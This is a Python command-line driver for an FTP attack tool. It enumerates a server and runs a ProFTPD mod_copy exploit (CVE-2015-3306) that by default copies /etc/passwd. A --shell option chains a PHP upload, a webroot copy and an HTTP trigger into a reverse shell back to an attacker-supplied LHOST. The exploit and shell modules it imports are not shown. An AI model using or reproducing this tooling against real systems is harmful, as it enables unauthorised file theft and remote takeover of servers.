import argparse,json
from .enumerator import enumerate_ftp
from .exploits import proftpd_modcopy
from .exploits import revshell

def main():
    p=argparse.ArgumentParser(prog="mbunga-ftp")
    p.add_argument("target"); p.add_argument("-p","--port",type=int,default=21)
    p.add_argument("-t","--timeout",type=float,default=3.0)
    p.add_argument("--json",dest="json_file")
    p.add_argument("--exploit",action="store_true",
                   help="run exploit check/PoC (ProFTPD 1.3.5 mod_copy, CVE-2015-3306)")
    p.add_argument("--src",default="/etc/passwd",help="source file for SITE CPFR")
    p.add_argument("--dst",default="/tmp/mbunga-proof.txt",help="destination for SITE CPTO")
    p.add_argument("--shell",metavar="LHOST",
                   help="get a reverse shell: upload PHP via FTP STOR, copy to webroot "
                        "via SITE CPFR/CPTO, trigger over HTTP, catch shell on LPORT")
    p.add_argument("--lport",type=int,default=4444,help="reverse shell listener port")
    p.add_argument("--webroot",default="/var/www/html",help="webroot for shell copy")
    p.add_argument("--http-port",type=int,default=80)
    p.add_argument("--user",default="anonymous"); p.add_argument("--passwd",default="anonymous@")
    a=p.parse_args()

    if a.shell:
        revshell.run(a.target,a.port,a.shell,a.lport,a.timeout,
                     a.webroot,a.http_port,a.user,a.passwd)
        return

    r=enumerate_ftp(a.target,a.port,a.timeout)
    print(f"MBUNGA-FTP v0.3 | {r['host']}:{r['port']}")
    print(f"Banner : {r['banner']}\nProduct: {r['product']}\nVersion: {r['version'] or 'unknown'}")
    for k in ("syst","feat","help"): print(f"\n[{k.upper()}]\n{r[k]}")
    if a.exploit:
        print("\n[EXPLOIT] ProFTPD mod_copy (CVE-2015-3306)")
        x=proftpd_modcopy.run(a.target,a.port,a.timeout,a.src,a.dst)
        for d in x["details"]: print("  "+d)
        print(f"  Vulnerable: {x['vulnerable']}")
        r["exploit"]=x
    if a.json_file:
        with open(a.json_file,"w",encoding="utf-8") as f: json.dump(r,f,indent=2,ensure_ascii=False)

if __name__=="__main__": main()
